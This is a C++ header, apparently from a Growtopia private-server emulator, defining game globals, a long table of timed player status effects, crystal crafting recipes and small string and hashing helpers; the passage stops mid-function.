#pragma once
using json = nlohmann::json;
int server_port = 0;
BYTE* item_data_ios;
int item_hash_ios, item_data_size_ios;
BYTE* item_data;
int item_hash, item_data_size;
vector<string> swear_words = {}, splicing, combining, combusting, crystals;
ENetHost* server;
string documents = "C:/Users/Admin/Desktop/SERVER";
//vector<pair<string, int>> item_prices;
// "C:/Users/admin/Desktop/SERVER/x64/Release";
//= "C:/Users/admin/Desktop/SERVER/x64/Release";
vector<int>random_shop_item;
//C:\Users\Administrator\Desktop\Release
vector<int> dstone;
vector<vector<int>> kainos = {

};
string domain = "", packet_data = "";
vector<pair<int, int>>items_washing;
string shop_list = "", opc_list = "", shop_list2 = "", shop_list2_2 = "", zombie_list = "", surgery_list = "", rare_text = "", rainbow_text = "", wolf_list = "";
vector<pair<int, int>> lockeitem, untradeitem, opc_item, zombieitem, surgeryitem, wolfitem, premium_item;

bool Carnival = false; // EVENT
bool Growganoth = true; // EVENT


bool secret_standopowah = false;

vector<vector<string>> info_about_playmods{
	// playmod id, consumableId_time, playmod name, playmod on used, playmod on removed, display id, state, skin, how work, eff, say text after using, gravity
	{"1", "388", "300", "Stinky", "You really really smell.", "The air clears.", "372", "14", "spray.wav", "", "", "", "", ""},
	{"2", "1368", "2", "Frozen", "Your body has turned to ice.You can't move!", "You've thawed out.", "1368", "11", "freeze.wav", "4284769380", "", "", "", ""},
	{"3", "274", "10","Frozen", "Freeze!", "You've thawed out.", "274", "11", "freeze.wav", "4284769380", "", "", "", ""},
	{"4", "874", "180", "Egged!", "You have egg on your face.", "You washed your face!", "874", "", "", "16777215", "throw", "42", "", ""},
	{"5", "3404", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"6", "3406","0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"7", "4422","0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"8", "386", "0","", "", "", "", "", "", "", "cutewords", "", "", ""},
	{"9", "10660", "1800", "Lucky in Love: Increased chance of Golden Heart Crystal", "Increased chance of Golden Heart Crystal!", "The honeymoon phase is over!", "10660", "", "", "", "", "", ":D`#YUMMY!``", ""},
	{"10", "2206", "1800", "Irradiated", "You are aglow with radiation!", "You have recovered.", "2206", "19", "", "", "", "", "", ""},
	{"11", "408", "300", "Duct Tape", "Duct tape has covered your mouth!", "Duct tape removed. OUCH!", "408", "13", "already_used.wav", "", "", "", "", ""},
	{"12", "384", "3600", "Valentine", "You are somebody's valentine!", "Yuck!", "384", "", "choir.wav", "2526478335", "", "", "", ""},
	{"13", "2480", "300", "Megaphone!", "Broadcasting to ALL!", "You can broadcast once again.", "2480", "", "", "", "", "", "", ""},
	{"14", "528", "1800", "Lucky", "You're luckier than before!", "Your luck has worn off.", "528", "15", "", "", "", "", "", ""},
	{"15", "1510", "10", "1512", "", "", "", "", "", "", "pet", "", "Legend says that you need 10 Blarney Pebbles!", ""},
	{"16", "4672", "1800", "Envious", "It ain't easy being you.", "Healthy color restored.", "4672", "", "eat.wav", "1627349247", "", "", "", ""},
	{"17", "196", "3600", "Feelin' Blue", "A `!blueberry`` slides down your throat!", "The effects of the `!blueberry`` have worn off.", "196", "", "spray.wav", "4278190335", "drop", "", "", ""},
	{"18", "338", "2", "Floating!", "Whoooooooaaaaaaaa...", "Gravity - it's the law.", "338", "", "balloon.wav", "", "drop", "", "", "-30"},
	{"19", "962", "180", "Saucy!", "You are a saucy person.", "You got cleaned up.", "962", "", "", "65535", "throw", "45", "", ""},
	{"20", "950", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"21", "968", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"22", "1058", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"23", "1096", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"24", "868", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"25", "782", "3600", "Antidote!", "You are now immune to zombie bites! Temporarily...", "Your immunity is gone.", "782", "", "", "", "drop", "25", "", ""},
	{"26", "4668", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"27", "128", "1800", "Golden Halo!", "You have been good.", "You're falling out of favor.", "128", "7", "", "-2104114177", "drop", "25", "", ""},
	{"28", "764", "60", "Infected!", "You've been infected by the g-Virus. Punch others to infect them, too! Braiiiins...", "You've been cured.", "764", "16", "", "", "drop", "", "", ""},
	{"29", "5178", "1800", "Lucky", "You're luckier than before!", "Your luck has worn off.", "5178", "15", "", "", "", "", "", ""},
	{"30", "1058", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"31", "1094", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"32", "1096", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"33", "1098", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"34", "2002", "86400","Doctor Replusion", "Doctors won't come near you!", "You no longer repel doctors.", "2002", "", "spray.wav", "", "", "", "", ""},
	{"35", "7058", "300", "Food: Purified Scythe", "Hand Scythe breaks 5% less!", "You no longer feel pure!", "7058", "15", "", "", "", "", "", ""},
	{"36", "1056", "1800", "Lucky", "You're luckier than before!", "Your luck has worn off.", "1056", "15", "", "", "", "", "", ""},
	{"37", "4378", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"38", "614", "300", "Rotten Egg", "You really really smell.", "The air clears.", "614", "14", "spray.wav", "", "", "", "", ""},
	{"39", "1374", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"40", "406", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"41", "966", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"42", "4766", "1800", "Blushing Red", "`4Cherry`` red lips!", "The effects of the `!Cherry`` have worn off.", "4766", "", "spray.wav", "842203135", "", "", "", ""},
	{"43", "958", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"44", "950", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"45", "1580", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"46", "7052", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"47", "1634", "5", "Caffeinated", "You are full of caffeine!", "Ugh. Caffeine crash.", "1634", "14", "spray.wav", "", "", "", "", ""},
	{"48", "4666", "0", "/cry", "", "", "", "", "", "", "consume", "", "", ""},
	{"49", "6314", "2", "Frozen", "Your body has turned to ice. You can't move!", "You've thawed out.", "6314", "11", "freeze.wav", "4284769380", "", "", "", ""},
	{"50", "3064", "0", "", "", "", "3064", "", "", "", "throw", "34", "", ""},
	{"51", "8520", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"52", "10628", "0", "/dab", "", "", "", "", "", "", "consume", "", "", ""},
	{"53", "1474", "1800", "Food: Extra XP", "25% chance of double XP for all actions.", "Your stomach's rumbling.", "1474", "", "spray.wav", "", "drop", "", "", ""},
	{"54", "3546", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"55", "3600", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"56", "3836", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"57", "3240", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"58", "4410", "0", ":P`#Bleh.``", "", "", "", "", "", "", "consume", "", "", ""},
	{"59", "4752", "0", ":D`#YUM!``", "", "", "", "", "", "", "cutewords", "", "", ""},
	{"60", "2734", "0", ":D`#YUM!``", "", "", "", "", "", "", "cutewords", "", "", ""},
	{"61", "3622", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"62", "10988", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"63", "4764", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"64", "964", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"65", "3428", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"66", "3816", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"67", "126", "1800", "Devil Horns", "You little devil...", "Off the naughty list!", "126", "6", "spray.wav", "", "drop", "", "", ""},
	{"68", "1964", "1800", "Devil Horns", "You little devil...", "Off the naughty list!", "1964", "6", "spray.wav", "", "drop", "", "", ""},
	{"69", "960", "5", "ON FIRE!!!", "You are burning up!", "The fire's out.", "960", "17", "spray.wav", "842203135", "", "", "", ""},
	{"70", "712", "5", "ON FIRE!!!", "You are burning up!", "The fire's out.", "712", "17", "spray.wav", "842203135", "", "", "", ""},
	{"71", "1988", "1800", "Haunted!", "You are haunted!", "Not anymore.", "372", "18", "spray.wav", "", "", "", "", ""},
	{"72", "1772", "2", "Floating!", "Whoooooooaaaaaaaa...", "Gravity - it's the law.", "1772", "", "balloon.wav", "", "drop", "", "", "-30"},
	{"73", "5262", "5", "Neon Gum!", "Dazzle your friends as super funky neon lines course across your skin.", "Party's over.", "5262", "28", "spray.wav", "", "drop", "", "", ""},
	{"74", "676", "86400","Doctor Replusion", "Doctors won't come near you!", "You no longer repel doctors.", "676", "", "spray.wav", "", "", "", "", ""},
	{"75", "276", "0", "", "", "", "", "", "", "", "cutewords", "", "", ""},
	{"76", "732", "60", "Banned", "Reality flickers as you begin to wake up.", "You are no longer banned. Now be good!", "732", "12", "", "", "", "", "", "" },
	{"77", "618", "0", "", "", "", "", "", "", "", "cutewords", "", "", ""},
	{"78", "616", "0", "", "", "", "", "", "", "", "cutewords", "", "", ""},
	{"79", "614", "0", ":P", "", "", "", "", "", "", "consume", "", "", ""},
	{"80", "750", "1800", "Lucky", "You're luckier than before!", "Your luck has worn off.", "750", "15", "", "", "", "", "", ""},
	{"81", "752", "0", "", "", "", "", "", "", "", "cutewords", "25", "", ""},
	{"82", "1208", "0", ":D`#YUM!``", "", "", "", "", "", "", "consume", "", "", ""},
	{"83", "5114", "120", "Calm Nerves", "Steady hands of a surgeon.", "Butterfingers again.", "5114", "14", "spray.wav", "", "", "", "", ""},
	{"84", "6912", "1800", "Spicey Skills", "Reduce your skill fails by half in both Surgery and Startopia missions.", "Your stomach's too spicey.", "6912", "", "spray.wav", "", "", "", "", ""},
	{"85", "3536", "0", "Mmm, sugar!", "", "", "", "", "", "", "consume", "", "", ""},
	{"86", "1260", "3600", "Malpractice", "You are not allowed to perform surgery for a while!", "You can surg again.", "1260", "", "", "", "", "", "", ""},
	{"87", "1270", "3600", "Recovering", "You are recovering from surgery.", "You healed.", "1270", "", "", "", "", "", "", ""},
	{"88", "8500", "0", "", "", "", "", "", "", "", "cutewords", "", "", ""},
	{"89", "4602", "300", "Stinky", "You really really smell.", "The air clears.", "4602", "14", "spray.wav", "", "", "", "", ""},
	{"90", "8544", "43200", "Lupus malady", "You've been infected with lupus!", "You no longer have lupus!", "8544", "", "spray.wav", "", "", "", "", ""},
	{"91", "8540", "43200", "Moldy Guts malady", "You've been infected with moldy guts!", "You no longer have moldy guts!", "8540", "", "spray.wav", "", "", "", "", ""},
	{"92", "8546", "43200", "Ecto-Bones malady", "You've been infected with Ecto-Bones!", "Your bones are no longer ectoplasmic!", "8546", "", "spray.wav", "", "", "", "", ""},
	{"93", "8538", "43200", "Chaos Infection malady", "You've been infected with CHAOS!", "You no longer have CHAOS!", "8538", "", "spray.wav", "", "", "", "", ""},
	{"94", "8548", "43200", "Fatty Liver malady", "You've been infected with fatty liver!", "You no longer have fatty liver!", "8548", "", "spray.wav", "", "", "", "", ""},
	{"95", "8542", "43200", "Brainworms malady", "You've been infected with brainworms!", "You no longer have brainworms!", "8542", "", "spray.wav", "", "", "", "", ""},
	{"96", "6908", "1800", "Food: Buff Duration", "Increase the duration of food buffs by 30%", "Your stomach can't take anymore buffs!", "6908", "", "spray.wav", "", "drop", "", "", ""},
	{"97", "5452", "1800", "Food: Extra XP", "10% chance of triple XP for all actions.", "Your body craves sugar!", "5452", "", "spray.wav", "", "drop", "", "", "" },
	{"98", "2734", "1200", "Ultimate Super Pineapple Magic", "Ultimate Super Pineapple", "The ULTIMATE Super Pineapple Magic has come to an end!", "2734", "25", "", "", "", "", "", "" },
	{"99", "8384", "10", "Gross Bean", "You really really smell.", "The air clears.", "8384", "14", "spray.wav", "", "", "", "", ""},
	{"100", "4256", "500", "Popcorn", "Popcorn!", "", "4256", "", "", "", "consume", "206", "", "" },
	{ "101", "5406", "300", "Red Winterfest Crown!", "You're in the Winterfest spirit.", "Your paper crown dissolved in your forehead sweat!", "5406", "", "spray.wav", "", "", "", "", "" },
	{ "102", "5408", "300", "Green Winterfest Crown!", "You're in the Winterfest spirit.", "Your paper crown dissolved in your forehead sweat!", "5408", "", "spray.wav", "", "", "", "", "" },
	{ "103", "5410", "300", "Silver Winterfest Crown!", "You're in the Winterfest spirit.", "Your paper crown dissolved in your forehead sweat!", "5410", "", "spray.wav", "", "", "", "", "" },
	{ "104", "5412", "300", "Gold Winterfest Crown!", "You're in the Winterfest spirit.", "Your paper crown dissolved in your forehead sweat!", "5412", "", "spray.wav", "", "", "", "", "" },
	{ "105", "4232", "0", "`#:D YUM!``", "", "", "4232", "", "", "", "consume", "204", "", "" },
	{ "106", "4324", "1800", "Extra XP", "Your brain has been enhanced!", "You're getting dumber by the second.", "4324", "", "spray.wav", "", "drop", "", "", "" },
	{ "107", "4596", "1800", "Food: Surgery XP", "Gain 30% more XP from Surgery!", "Your stomach's rumbling.", "4596", "", "spray.wav", "", "drop", "", "", "" },
	{ "108", "11068", "0", "`#:D Ahhh! That is REFRESHING!``", "", "", "11068", "", "", "", "consume", "204", "", "" },
	{ "109", "6050", "1800", "Food: Pet Gems 200", "Get 200 Gems for beating a Pet Trainer.", "Your stomach's rumbling.", "6050", "", "spray.wav", "", "drop", "", "", "" },
	{ "110", "6048", "1800", "Food: Pet Gems 150", "Get 150 Gems for beating a Pet Trainer.", "Your stomach's rumbling.", "6048", "", "spray.wav", "", "drop", "", "", "" },
	{ "111", "6046", "1800", "Food: Pet Gems 100", "Get 100 Gems for beating a Pet Trainer.", "Your stomach's rumbling.", "6046", "", "spray.wav", "", "drop", "", "", "" },
	{ "112", "6910", "1800", "Food: Delectable", "25% chance of double Growtokens from Daily Quests.", "Your stomach's devasted!", "6910", "", "spray.wav", "", "drop", "", "", "" },
	{ "113", "4604", "1800", "Food: Breaking Gems", "10% chance of a gem when you break a block.", "Your stomach's rumbling.", "4604", "", "spray.wav", "", "drop", "", "", "" },
	{ "114", "3728", "6", "Slimed!", "You're covered in ectoplasm!", "You got cleaned up.", "3728", "", "spray.wav", "", "drop", "", "", "" },
	{ "115", "1602", "900", "Minty", "Ya'll are feelin' minty, sugah.", "Healthy color restored.", "1602", "", "eat.wav", "1627349247", "", "", "", "" },
	{ "116", "12152", "600", "Janeway's Coffee: Speedy", "On my mark... Go Fast!", "Speed normalized!", "12152", "14", "spray.wav", "", "", "", "", "" },
	{ "117", "4982", "180", "Orange", "You are a orange person.", "You got cleaned up.", "4982", "", "spray.wav", "9240575", "", "", "", "" },
	{ "118", "4594", "1800", "Food: Tree Growth food buff", "Trees you plant grow 5% faster!", "Your stomach's rumbling.", "4594", "", "spray.wav", "", "drop", "", "", "" },
	{ "119", "1662", "5", "Spikeproof", "You are briefly immune to spikes and lava", "You feel vulnerable again.", "1662", "10", "", "", "", "", "", "" },
	{ "120", "733", "120", "BAN Cooldown!", "BAN cooldown!", "Your ban cooldown is gone.", "732", "", "", "", "", "", "", "" },
	{ "121", "2480", "1800", "BONUS-SB!", "Broadcasting to ALL!", "You can broadcast once again.", "2480", "", "", "", "", "", "", "" },
	{ "122", "2480", "60", "SPECIAL SB!", "Broadcasting to ALL!", "You can broadcast once again.", "2480", "", "", "", "", "", "", "" },
	{ "123", "368", "6", "Muddy", "You've been splattered with mud!", "Clean again!", "368", "", "spray.wav", "1348237567", "", "", "", "" },
	{ "124", "10490", "1800", "Performance Enhanced!", "Increased Points with Gloves!", "Get back to the competition!", "10490", "", "spray.wav", "", "", "", "", "" },
	{ "125", "9852", "2678400", "Guardian Role", "You have received guardian role!", "Guardian role is over...", "9852", "", "spray.wav", "", "drop", "", "", "" },
	{ "126", "9854", "2678400", "VIP Role", "You have received VIP role!", "VIP role is over...", "9854", "", "spray.wav", "", "drop", "", "", "" },
	{ "127", "9018", "600", "Dark Ticket", "Welcome to TOMB OF GROWGANOTH!", "Your journey is over...", "9018", "", "boo_evil_laugh.wav", "", "drop", "", "", "" },
	{ "128", "2992", "600", "Wolf Whistle", "Welcome to Wolf World!", "Your journey is over...", "2992", "", "boo_evil_laugh.wav", "", "drop", "", "", "" },
	{ "129", "9266", "86400", "1-Day Subscription Token", "Received 1 Day Subscribtion", "Your journey is over...", "9266", "", "spray.wav", "", "drop", "", "", "Subscribtion" },
	{ "130", "6856", "259200", "3-Day Subscription Token", "Received 3 Day Subscribtion", "Your journey is over...", "6856", "", "spray.wav", "", "drop", "", "", "Subscribtion" },
	{ "131", "6858", "1209600", "14-Day Subscription Token", "Received 14 Day Subscribtion", "Your journey is over...", "6858", "", "spray.wav", "", "drop", "", "", "Subscribtion" },
	{ "132", "6860", "2592000", "30-Day Subscription Token", "Received 30 Day Subscribtion", "Your journey is over...", "6860", "", "spray.wav", "", "drop", "", "", "Subscribtion" },
	{ "133", "8188", "31536000", "1-Year Subscription Token", "Received 1 Year Subscribtion", "Your journey is over...", "8188", "", "spray.wav", "", "drop", "", "", "Subscribtion" },
	{ "134", "11400", "1800", "Energy Drink: Double XP & gems", "Double gems & XP!", "Your stomach's rumbling.", "11400", "", "eat.wav", "", "drop", "", "", "" },
	{ "135", "4830", "3", "Balloon Immunity", "Balloons can't hit you, but you can't throw them either.", "You can now throw balloons and get hit by them too.", "4830", "15", "eat.wav", "", "drop", "", "", "" },
	{ "136", "4844", "600", "Dripping Wet!", "You've been hit, you're too wet to throw balloons.", "All dry, go nuts.", "4844", "27", "", "", "throw", "0", "", "" },
	{ "137", "4842", "600", "Balloon-Proof", "Balloon repellent applied.", "Your stomach's rumbling.", "4842", "", "spray.wav", "", "drop", "", "", "" },
	{ "138", "4882", "600", "Towel Rack Checkpoint", "Towel Rack Checkpoint cooldown.", "You can hit the checkpoint again!", "4882", "", "spray.wav", "", "drop", "", "", "" },
	{ "139", "278", "60", "Curse", "You've been cursed to (the world) `4hell``!", "You are free to go!", "278", "12", "", "", "", "", "", "" },
	{ "140", "4984", "0", "`#:D YUM!``", "", "", "4984", "", "", "", "consume", "204", "", "" },
	{ "141", "9904", "600", "Stinky", "You really really smell.", "The air clears.", "9904", "14", "spray.wav", "", "", "", "", ""},
	{ "142", "2480", "60", "Legend SB!", "Broadcasting to ALL!", "You can broadcast once again.", "2480", "", "", "", "", "", "", "" },
	{ "143", "9726", "604800", "Cheater Role Ĝ", "You have received cheater role!", "Cheater role is over...", "9726", "", "spray.wav", "", "drop", "", "", "" },
	{ "144", "12600", "250", "Ultra World Spray", "Calmdown with the world spray..", "You can now use ultra world spray again.", "12600", "", "", "", "", "", "", "" },
	{ "145", "6914", "1800", "Sparkling Gems", "Get extra gems from a variety of actions!", "Your stomach has too many bubbles!", "6914", "", "spray.wav", "", "drop", "", "", "" },
	{ "146", "5940", "1800", "Guild Potion: Fishing", "The Guild Leader released the magic!", "The effects of the Guild Potion have ended!", "5940", "", "spray.wav", "", "drop", "", "", "" },
	{ "147", "5942", "1800", "Guild Potion: Blocks", "The Guild Leader released the magic! 1% chance of Extra Blocks!", "The effects of the Guild Potion have ended!", "5942", "", "spray.wav", "", "drop", "", "", "" },
	{ "148", "5934", "1800", "Guild Potion: Geiger", "The Guild Leader released the magic!", "The effects of the Guild Potion have ended!", "5934", "", "spray.wav", "", "drop", "", "", "" },
	{ "149", "5938", "1800", "Guild Potion: Gems", "The Guild Leader released the magic! 1% bonus chance of Extra Gems!", "The effects of the Guild Potion have ended!", "5938", "", "spray.wav", "", "drop", "", "", "" },
	{ "150", "2446", "10800", "Extra XP & Extra Wealth & Calm Nerves", "Ĵ A Night Luck for everything applied! Ĵ", "You lost your night luck... Ĵ", "2446", "", "", "", "", "", "", "" },
	{ "151", "5984", "1800", "High Jump", "Your feet spring to life", "Your feet shrink back to normal", "5984", "", "spray.wav", "", "drop", "", "", "" },
	{ "152", "3742", "60", "Spray Tan", "You are orange.", "The spray tan wore off.", "3742", "", "spray.wav", "613939967", "", "", "", "" },
	{ "153", "10400", "86400", "Cheater Role Ĝ", "You have received cheater role!", "Cheater role is over...", "10400", "", "spray.wav", "", "drop", "", "", "" },
	{ "154", "7056", "1800", "Food: Extra XP", "25% chance of double XP for catching ghosts.", "Your stomach's rumbling.", "7056", "", "spray.wav", "", "drop", "", "", "" }
};

vector<vector<vector<int>>> crystal_receptai = {
	{{2242 /*red*/, 2}, {2244 /*green*/, 0}, {2246 /*blue*/, 0}, {2248 /*white*/, 3}, {2250 /*black*/, 0}, {2254, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 1}, {2246 /*blue*/, 0}, {2248 /*white*/, 3}, {2250 /*black*/, 0}, {2262, 1}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 3}, {2246 /*blue*/, 0}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {2942, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 0}, {2246 /*blue*/, 2}, {2248 /*white*/, 3}, {2250 /*black*/, 0}, {2258, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 1}, {2246 /*blue*/, 1}, {2248 /*white*/, 3}, {2250 /*black*/, 0}, {2264, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 3}, {2246 /*blue*/, 2}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {2944, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 2}, {2246 /*blue*/, 0}, {2248 /*white*/, 3}, {2250 /*black*/, 0}, {2256, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 0}, {2246 /*blue*/, 1}, {2248 /*white*/, 3}, {2250 /*black*/, 0}, {2260, 1}},
	{{2242 /*red*/, 3}, {2244 /*green*/, 0}, {2246 /*blue*/, 2}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {2940, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 0}, {2246 /*blue*/, 0}, {2248 /*white*/, 0}, {2250 /*black*/, 5}, {2212, 1}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 0}, {2246 /*blue*/, 2}, {2248 /*white*/, 1}, {2250 /*black*/, 0}, {2972, 1}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 1}, {2246 /*blue*/, 2}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {2268, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 2}, {2246 /*blue*/, 0}, {2248 /*white*/, 1}, {2250 /*black*/, 2}, {2266, 1}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 0}, {2246 /*blue*/, 0}, {2248 /*white*/, 0}, {2250 /*black*/, 3}, {2754, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 0}, {2246 /*blue*/, 0}, {2248 /*white*/, 3}, {2250 /*black*/, 1}, {2756, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 3}, {2246 /*blue*/, 0}, {2248 /*white*/, 2}, {2250 /*black*/, 0}, {2706, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 1}, {2246 /*blue*/, 1}, {2248 /*white*/, 0}, {2250 /*black*/, 2}, {3180, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 0}, {2246 /*blue*/, 0}, {2248 /*white*/, 2}, {2250 /*black*/, 3}, {4124, 1}},
	{{2242 /*red*/, 3}, {2244 /*green*/, 0}, {2246 /*blue*/, 0}, {2248 /*white*/, 2}, {2250 /*black*/, 0}, {5268, 1}},
	{{2242 /*red*/, 3}, {2244 /*green*/, 1}, {2246 /*blue*/, 0}, {2248 /*white*/, 1}, {2250 /*black*/, 0}, {5266, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 0}, {2246 /*blue*/, 0}, {2248 /*white*/, 1}, {2250 /*black*/, 4}, {6848, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 0}, {2246 /*blue*/, 3}, {2248 /*white*/, 2}, {2250 /*black*/, 0}, {6820, 1}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 2}, {2246 /*blue*/, 3}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {2272, 3}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 0}, {2246 /*blue*/, 3}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {2276, 5}},
	{{2242 /*red*/, 0}, {2244 /*green*/, 2}, {2246 /*blue*/, 1}, {2248 /*white*/, 2}, {2250 /*black*/, 0}, {2252, 1}},
	{{2242 /*red*/, 3}, {2244 /*green*/, 0}, {2246 /*blue*/, 1}, {2248 /*white*/, 1}, {2250 /*black*/, 0}, {2274, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 2}, {2246 /*blue*/, 2}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {2270, 10}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 1}, {2246 /*blue*/, 1}, {2248 /*white*/, 1}, {2250 /*black*/, 0}, {2590, 5}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 1}, {2246 /*blue*/, 1}, {2248 /*white*/, 1}, {2250 /*black*/, 0}, {2812, 1}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 2}, {2246 /*blue*/, 0}, {2248 /*white*/, 1}, {2250 /*black*/, 0}, {3424, 1}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 2}, {2246 /*blue*/, 1}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {3770, 3}},
	{{2242 /*red*/, 3}, {2244 /*green*/, 2}, {2246 /*blue*/, 0}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {3526, 20}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 2}, {2246 /*blue*/, 0}, {2248 /*white*/, 0}, {2250 /*black*/, 1}, {3582, 1}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 0}, {2246 /*blue*/, 2}, {2248 /*white*/, 0}, {2250 /*black*/, 1}, {4762, 1}},
	{{2242 /*red*/, 2}, {2244 /*green*/, 1}, {2246 /*blue*/, 0}, {2248 /*white*/, 2}, {2250 /*black*/, 0}, {5204, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 0}, {2246 /*blue*/, 2}, {2248 /*white*/, 2}, {2250 /*black*/, 0}, {5106, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 1}, {2246 /*blue*/, 1}, {2248 /*white*/, 2}, {2250 /*black*/, 0}, {5104, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 2}, {2246 /*blue*/, 1}, {2248 /*white*/, 1}, {2250 /*black*/, 0}, {5272, 10}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 3}, {2246 /*blue*/, 1}, {2248 /*white*/, 0}, {2250 /*black*/, 1}, {5274, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 1}, {2246 /*blue*/, 1}, {2248 /*white*/, 3}, {2250 /*black*/, 0}, {5270, 1}},
	{{2242 /*red*/, 1}, {2244 /*green*/, 3}, {2246 /*blue*/, 1}, {2248 /*white*/, 0}, {2250 /*black*/, 0}, {5280, 10}},
	{{2242 /*red*/, 3}, {2244 /*green*/, 0}, {2246 /*blue*/, 0}, {2248 /*white*/, 1}, {2250 /*black*/, 1}, {392, 1}},
	{{2242 /*red*/, 4}, {2244 /*green*/, 0}, {2246 /*blue*/, 4}, {2248 /*white*/, 5}, {2250 /*black*/, 5}, {12304, 1}},
	{{2242 /*red*/, 10}, {2244 /*green*/, 0}, {2246 /*blue*/, 10}, {2248 /*white*/, 10}, {2250 /*black*/, 10}, {9886, 1}}
};
vector<vector<vector<int>>> receptai;
struct dotted : numpunct<char> {
	char do_thousands_sep()   const { return ','; }
	string do_grouping() const { return "\3"; }
	static void imbue(ostream& os) { os.imbue(locale(os.getloc(), new dotted)); }
};
string setGems(int gems) {
	stringstream ss;
	dotted::imbue(ss);
	ss << gems;
	return ss.str();
}


string fixchar2(string name) {
	string ret;
	for (int i = 0; i < name.length(); i++) if (name[i] == '<@' || name[i] == '`' || name[i] == '`#' || name[i] == '``' || name[i] == '`0' || name[i] == '`8' || name[i] == '`6' || name[i] == '`9' || name[i] == '`4' || name[i] == '`2') i++; else ret += name[i];
	return ret;
}

string fixchar4(string name) {
	string ret;
	for (int i = 0; i < name.length(); i++) if (name[i] == '`') i++; else ret += name[i];
	return ret;
}


inline uint32_t name_to_number(const std::string& str) {
	uint32_t hash = 0x811c9dc5;
	uint32_t prime = 0x1000193;
	for (int i = 0; i < str.size(); ++i) {
		uint8_t value = str[i];
		hash = hash ^ value;
		hash *= prime;
	}
	hash /= 100;
	return hash;
}


string fixchar3(string str)
{
	string newS;
	for (char c : str) newS += (c >= 'A' && c <= 'Z') ? c - ('A' - 'a') : c;
	string ret;
	for (int i = 0; i < newS.length(); i++) if (newS[i] == '`') i++; else ret += newS[i];
	string ret2;
	for (char c : ret) if ((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) ret2 += c;
	int current = 0;
	for (int i = 0; i < ret2.length(); i++) {
		if (!isdigit(ret2[i])) {
			ret2[current] = ret2[i];
			current++;
